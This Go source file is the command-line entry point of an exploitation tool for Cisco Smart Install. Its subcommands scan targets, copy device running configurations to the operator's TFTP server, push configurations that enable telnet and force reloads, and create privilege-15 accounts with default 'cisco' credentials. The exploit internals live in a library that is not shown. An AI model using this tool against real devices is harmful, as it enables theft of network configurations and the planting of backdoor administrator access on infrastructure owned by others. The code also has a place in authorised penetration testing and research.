package main

import (
	"fmt"
	"os"

	"github.com/spf13/cobra"
	"Go-SIET/libs"
)

var (
	// Global flags
	targetIP     string
	ipListFile   string
	publicIP     string
	configFile   string
	username     string
	password     string
	reloadTime   string
)

// rootCmd represents the base command
var rootCmd = &cobra.Command{
	Use:   "Go-SIET",
	Short: "Go Smart Install Exploitation Tool (Go-SIET)",
	Long: "Go-SIET is a tool for testing and exploiting Cisco Smart Install vulnerabilities.",
	CompletionOptions: cobra.CompletionOptions{
		HiddenDefaultCmd: true,
	},
}

// testCmd represents the test command
var testCmd = &cobra.Command{
	Use:   "test",
	Short: "Test devices for Smart Install vulnerabilities",
	Long: `Test one or more devices to check if they are vulnerable to Smart Install attacks.

The test command sends a specific Smart Install packet to the target device(s) and 
analyzes the response to determine if the Smart Install Client feature is active,
which indicates a vulnerability.

Examples:
  Go-SIET test -i 192.168.1.1
  Go-SIET test -l targets.txt
  Go-SIET test --ip 10.0.0.1 --public-ip 203.0.113.1`,
	RunE: func(cmd *cobra.Command, args []string) error {
		if err := validateTarget(); err != nil {
			return err
		}
		
		config := buildConfig("test")
		client := libs.NewSIETClient(config)
		client.TestMode()
		return nil
	},
}

// getConfigCmd represents the get-config command
var getConfigCmd = &cobra.Command{
	Use:   "get-config",
	Short: "Retrieve device configurations",
	Long: `Retrieve the running configuration from vulnerable Smart Install devices.

This command exploits the Smart Install vulnerability to copy the device's 
running configuration to a local TFTP server. The configuration files will 
be saved in the 'tftp' directory with the naming format: [IP].conf

Examples:
  Go-SIET get-config -i 192.168.1.1
  Go-SIET get-config -l targets.txt
  Go-SIET get-config --ip 10.0.0.1 --public-ip 203.0.113.1`,
	RunE: func(cmd *cobra.Command, args []string) error {
		if err := validateTarget(); err != nil {
			return err
		}
		
		config := buildConfig("get_config")
		client := libs.NewSIETClient(config)
		client.StartTFTPServer()
		defer client.StopTFTPServer()
		client.GetConfigMode()
		return nil
	},
}

// changeConfigCmd represents the change-config command
var changeConfigCmd = &cobra.Command{
	Use:   "change-config",
	Short: "Change device configurations",
	Long: `Change the configuration of vulnerable Smart Install devices.

This command uploads a new configuration to the target device. You can either 
specify a custom configuration file using --config, or use the default 
configuration which creates a user account and enables remote access.

The default configuration creates:
- Username/password specified by --username and --password flags
- DHCP-enabled Vlan1 interface
- Telnet access enabled

Examples:
  Go-SIET change-config -i 192.168.1.1
  Go-SIET change-config -i 192.168.1.1 -c custom.conf
  Go-SIET change-config -i 10.0.0.1 -u admin -p secret123
  Go-SIET change-config -i 192.168.1.1 --reload-time 00:05`,
	RunE: func(cmd *cobra.Command, args []string) error {
		if err := validateSingleTarget(); err != nil {
			return err
		}
		
		config := buildConfig("change_config")
		client := libs.NewSIETClient(config)
		client.StartTFTPServer()
		defer client.StopTFTPServer()
		client.ChangeConfigMode()
		return nil
	},
}

// executeCmd represents the execute command
var executeCmd = &cobra.Command{
	Use:   "execute",
	Short: "Execute commands on vulnerable devices",
	Long: `Execute commands on vulnerable Smart Install devices.

This command creates a user account on the target device by executing 
configuration commands. The default execution creates a privileged user 
account that can be used for further access to the device.

The executed commands create:
- A user account with privilege level 15 (full access)
- Username and password specified by --username and --password flags

Examples:
  Go-SIET execute -i 192.168.1.1
  Go-SIET execute -i 10.0.0.1 -u admin -p secret123
  Go-SIET execute -i 192.168.1.1 --public-ip 203.0.113.1`,
	RunE: func(cmd *cobra.Command, args []string) error {
		if err := validateSingleTarget(); err != nil {
			return err
		}
		
		config := buildConfig("execute")
		client := libs.NewSIETClient(config)
		client.StartTFTPServer()
		defer client.StopTFTPServer()
		client.ExecuteMode()
		return nil
	},
}

func init() {
	// Add subcommands
	rootCmd.AddCommand(testCmd)
	rootCmd.AddCommand(getConfigCmd)
	rootCmd.AddCommand(changeConfigCmd)
	rootCmd.AddCommand(executeCmd)

	// Global flags for all commands
	rootCmd.PersistentFlags().StringVarP(&targetIP, "ip", "", "", "Target IP address")
	rootCmd.PersistentFlags().StringVarP(&ipListFile, "list", "l", "", "File containing list of target IPs")
	rootCmd.PersistentFlags().StringVarP(&publicIP, "public-ip", "", "", "Public IP address (for public targets, suitable for NAT scenarios)")
	rootCmd.PersistentFlags().StringVarP(&username, "username", "u", "cisco", "Username for authentication")
	rootCmd.PersistentFlags().StringVar(&password, "password", "cisco", "Password for authentication")

	// Command-specific flags
	changeConfigCmd.Flags().StringVarP(&configFile, "config", "c", "", "Custom configuration file path")
	changeConfigCmd.Flags().StringVarP(&reloadTime, "reload-time", "", "00:01", "Device reload time in HH:MM format")
	
	executeCmd.Flags().StringVarP(&reloadTime, "reload-time", "", "00:01", "Device reload time in HH:MM format")
}

func main() {
	if err := rootCmd.Execute(); err != nil {
		fmt.Fprintf(os.Stderr, "Error: %v\n", err)
		os.Exit(1)
	}
}

// validateTarget ensures either IP or IP list is provided
func validateTarget() error {
	if targetIP == "" && ipListFile == "" {
		return fmt.Errorf("either --ip (-i) or --list (-l) must be specified")
	}
	if targetIP != "" && ipListFile != "" {
		return fmt.Errorf("cannot specify both --ip and --list at the same time")
	}
	return nil
}

// validateSingleTarget ensures only single IP is provided (for modes that don't support multiple IPs)
func validateSingleTarget() error {
	if targetIP == "" {
		return fmt.Errorf("--ip (-i) must be specified for this command")
	}
	if ipListFile != "" {
		return fmt.Errorf("this command only supports single target IP, use --ip (-i) instead of --list (-l)")
	}
	return nil
}

// buildConfig creates a Config struct from the command line flags
func buildConfig(mode string) *libs.Config {
	return &libs.Config{
		IP:         targetIP,
		IPList:     ipListFile,
		Mode:       mode,
		PublicIP:   publicIP,
		ConfigFile: configFile,
		Username:   username,
		Password:   password,
		ReloadTime: reloadTime,
	}
}
